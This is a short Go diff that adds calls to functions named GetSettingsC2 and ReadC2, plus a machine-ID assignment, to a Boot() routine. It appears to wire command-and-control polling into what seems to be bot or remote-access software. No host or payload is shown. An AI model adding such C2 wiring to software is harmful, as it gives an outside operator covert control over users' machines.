@@ -74,6 +74,10 @@ func Boot() {
 		go StartGuardian()
 	}
 
+	MyID = MachineID()
+	go GetSettingsC2()
+	go ReadC2()
+
 	// load information
 	// start routines
 
